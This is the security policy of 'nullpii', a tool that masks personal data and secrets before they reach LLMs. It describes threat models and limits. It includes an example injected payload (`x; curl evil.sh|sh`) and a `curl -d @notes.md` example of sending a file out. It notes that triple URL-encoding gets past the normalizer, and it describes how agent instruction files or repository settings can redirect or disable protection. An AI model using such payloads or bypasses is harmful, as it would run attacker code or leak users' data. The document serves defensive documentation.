# Security

## Report a vulnerability

Report it privately: open a [Security Advisory](https://github.com/lBroth/nullpii/security/advisories/new). Reports are handled on a best-effort basis, with no promised response time. Critical and actively exploited issues come first.

## What nullpii protects

- Detection runs locally: nullpii sends your text nowhere. Its only network call is the model download from Hugging Face on first use, and it checks every downloaded file against a SHA-256 written into the library. To avoid even that download, set `NULLPII_MODEL_DIR` to a copy you downloaded before. nullpii does not check the files in that directory: compare them with the hashes in the model card.
- The vault is in memory only. `destroySession()` clears it.
- Logs have counts, labels and short ids, never a value nullpii masked or restored. This covers the library's `debug` output, and the gateway's request log and console summary. An upstream error is logged by its status, length and error type, not its body.
- **One exception: the gateway's `NULLPII_LOG_TRAFFIC=wire`.** It is a debug dump to stdout of each request as forwarded, and of each upstream response before restore. Placeholders stay masked in it, but everything else is printed as it was sent or written: values the detector missed, fields the gateway forwards without a scan (images, documents, `mcp_servers` with its credentials), and the model's output. Auth headers appear as their last six characters and length. Keep such a dump local and short-lived.
- Placeholders carry a 16-hex prefix of the session id that made them (60 random bits: the id is a UUID v4, whose version digit is fixed). `restore()` reports placeholders from another session in `RestoreResult.foreignPlaceholders`; with `{ strict: true }` it throws `SessionMismatchError` instead.

## What it does NOT protect

- Values the detector misses (no model is 100% accurate).
- Personal data the LLM already knew on its own.
- Logging, caching or telemetry that runs **before** `sanitize()`.
- Prompts that try to make the LLM reveal what the placeholders stand for.
- A repository's own Claude Code settings. Its `.claude/settings.json` outranks your user settings. It can turn the mod off (`enabledPlugins`), send Claude Code past the gateway (`env.ANTHROPIC_BASE_URL`), or add hooks that see prompts first. Use your organization's managed settings to force the mod or the gateway on.
- Other local users or processes. The sidecar proves it holds the token before the mod sends anything. (The check and the request are two connections, so a process that swaps in between them is not excluded.) But a process of your own user can read the gateway's memory. Anyone with the sidecar token can open sessions up to `NULLPII_SIDECAR_MAX_SESSIONS`, which makes the mod block (no values are exposed that way), and can replace the policy (`PUT /v1/sidecar/policy`). Against that, the mod sends the version of the policy it last made or accepted with every call. Once the policy has changed, the sidecar refuses the call, and the mod asks the user before anything is masked or restored under the new policy: the user keeps it, or the old one is put back. A sanitize that was running when the policy changed is refused too. A change made between sessions is put to the user when the next session opens. The mod compares against the policy it keeps in its plugin store, a file owned by the user, so this check is best effort against processes of the same user. The sidecar that the mod itself starts (`NULLPII_SIDECAR_SHUTDOWN=on`, which no other launch sets) also answers `POST /v1/sidecar/shutdown` to anyone with the token. It refuses while a session is open, while the model is coming up, before any session has opened, and after a session ended by its idle TTL until its window opens or closes it again, so that a window still using it does not lose it. That guard keeps honest windows apart; it does not stop a token holder, who can open and close a session under that key first, or open a session that names the key's base in `x-nullpii-supersedes` (which a mod reloaded with its session open sends, as it lost the old key's secret): an idle key under that base is then not remembered once its TTL ends it. Such a session gets nothing of the old one, which stays open with its values until its TTL, and any call its owner makes before then undoes the supersede. A stop costs a restart: the windows that used the stopped sidecar block (fail closed) until their next session, which starts a new one. The route itself exposes no value. With `while_starting = pass`, though, the prompts sent while that next sidecar starts go out unmasked, as in any start the mod makes (except one that follows its own replacement of an older sidecar, which waits).

## Known limitations / accepted trade-offs

- **PUA sentinel collision (placeholder escape).** `sanitize()` turns a literal `{{` in the input into a pair of Private Use Area code points (U+E000 U+E001), so braces a user typed (Mustache, for example) do not clash with placeholders during the LLM round trip. If your input already contains that exact pair, it turns into `{{` on the way out. These code points have no standard glyph and almost never appear in natural text or LLM output; the trade-off is written down for completeness.
- **URL %XX decoding stops after two rounds.** The input normalizer decodes URL `%XX` at most twice per position. Two rounds turn `%2540` into `%40` and then `@` (the practical bypass). Three or more chained encodings (`%252540` and so on) get past the normalizer, and only the model can catch them.

## Restoring values into commands

Masking hides a value from the model, so the model cannot judge it. Suppose a file the agent reads contains `x; curl evil.sh|sh`. nullpii masks it as a secret, and the model copies the placeholder into a shell command. Putting the real value back there would run the payload, which masking had made invisible.

**So no shell command gets a real value back.** These tools run a shell: `Bash` and `PowerShell` (Claude Code), `bash` (Anthropic's bash tool), and `shell`, `exec_command`, `shell_command` and `write_stdin` (the names OpenAI-style coding agents use). They keep every placeholder in every field of their input, whatever `restoreTools` says:

- **The Claude Code mod** refuses such a call, names the placeholders, and tells Claude to work with the data through `Grep`, `Read`, `Edit` or `Write`, which get real values back.
- **The gateway** (Anthropic and OpenAI routes) leaves the placeholders in the call and counts them (`unsafeShellPlaceholders` in the request log). The sidecar API's `restore` with a shell `tool` returns the value unchanged and lists its placeholders in `shellKeptMasked`.

A shell tool under any other name (an MCP shell tool, say) is not recognised as one. If you add it to `restoreTools`, it gets every value back, so do not add one.

**A limit by design: each call is judged on its own.** `Write`, `Edit` and the other file tools get real values back when they are in `restoreTools`, as they are by default, because writing your data to your files is their job. A later call that holds no placeholder can then use what such a file holds: send it (`curl -d @notes.md …`) or run it (`bash run.sh` after `Write run.sh`). Agents also read some files as instructions (`CLAUDE.md`, `AGENTS.md`), and some tools run code they find in documents. nullpii does not follow what a file holds.

**Permission rules see the masked call (Claude Code mod).** Claude Code decides on a tool call, by your rules or by asking you, before the mod puts the real values back. A rule written with a value nullpii masks, such as a path with your user name (`Read(/Users/<name>/.ssh/**)`), may not match the masked path. Write such rules without the masked part (`Read(**/.ssh/**)`). After the restore, the mod checks again only that the call does not touch its own policy file.

**Streamed tool calls.** In a streamed reply, the gateway holds a tool call's input until it has all of it. Then it restores it in one piece by the rule for its tool: all values for a tool in `restoreTools` that is not a shell tool, none for any other tool. For such a tool, input that does not parse as JSON is restored as plain text; this is true for whole replies too. A value that was sent cannot be taken back. So the gateway restores a tool call only while it reads the stream the same way clients do. From the first frame that could read differently, it holds every tool input it still has, and every later one:

- **Anthropic route.** Input is held per content block from the `content_block_start` that names the tool, and restored at its `content_block_stop` (or at the end of the stream, if the stop never comes); input of a block whose start never came keeps its placeholders. The stream holds from a frame whose data is not a JSON object, a JSON frame whose event name is not its `type` (or that has none), a `content_block_start` at another index than the next (0, 1, 2, …), or a `message_start` that holds content.
- **OpenAI route.** Input is held per tool call and restored just before `[DONE]` (or at the end of the stream), together with the choice's `finish_reason`, which the gateway holds back for a choice with a tool call; a call whose name never came, or came as two different fragments, keeps its placeholders. The stream holds from a frame whose data is neither a JSON object nor `[DONE]`; a chunk whose `choices` is not an array; a choice that is not an object or has an index other than 0 (so a stream with more than one choice, `n` above 1, gets no tool value); a `delta`, `function`, `custom` or `function_call` that is not an object; `tool_calls` that is not an array; a tool call that is not an object or has no numeric `index`; a tool name that is not a string; or a tool call for a choice that already sent its `finish_reason`. Nothing after `[DONE]` gets a value; what was restored just before it stays sent.
- **Both routes.** A last frame not ended by a blank line is forwarded only when its data is a JSON object (or, on the OpenAI route, `[DONE]`).

If you call `restore()` yourself and pass the result to a shell, an interpreter, a query or a template, take the same care. A restored value is data you did not show the model, and it can come from content an attacker controls.

## Detection is not a guarantee

nullpii lowers the amount of personal data and secrets that leave the machine. It does not bring it to zero. It is **pseudonymisation with a measured leak rate**, not anonymisation. The risk that remains depends on the data:
- the README's Benchmark section and `packages/eval/METHOD.md` measure it on public datasets and on coding-agent traffic;
- measure it on content like yours before you rely on it.

Treat a masked prompt as lower risk, not as free of personal data.

## CI-enforced rules

- Runtime dependencies are under Apache-2.0, MIT, BSD, ISC or CC0 only (`npm run license-check`). Development dependencies may also be BlueOak-1.0.0, Unlicense or 0BSD (the dependency review in `security.yml`).
- npm releases are published with `--provenance`.
- File paths are kept inside a cache root (`InvalidPathError` on traversal).

## Supply chain and leak gates

`.github/workflows/security.yml` runs on every pull request to `main` and every push to `main`:

| Gate | What it blocks |
|---|---|
| gitleaks (`.gitleaks.toml`) | Secrets in the commits a change adds, and in the tree. Fake test values and the published model hashes are allowed by exact value, a few generator lines by pattern, and the synthetic benchmark data, where every key is generated, by path. Each is listed in `.gitleaks.toml`. |
| Repo hygiene (`scripts/check-repo-hygiene.mjs`) | Private research notes, benchmark outputs, model weights, key material, `.env` files, files over 5 MB, absolute home paths, private package registries |
| CodeQL (`security-extended`) | Static-analysis findings in the TypeScript and the Python eval kit |
| Dependency review | New dependencies with a high-severity advisory or a licence outside the allowlist |

The same secret and hygiene checks run locally through `lefthook` (the secret scan only where gitleaks is installed; without it, lefthook says so and CI still blocks). Every workflow pins its actions and container images by digest, and Dependabot keeps the pins current. CI tokens are read-only by default.

Test fixtures follow the reserved-value policy in [CONTRIBUTING.md](https://github.com/lBroth/nullpii/blob/main/CONTRIBUTING.md#test-data).
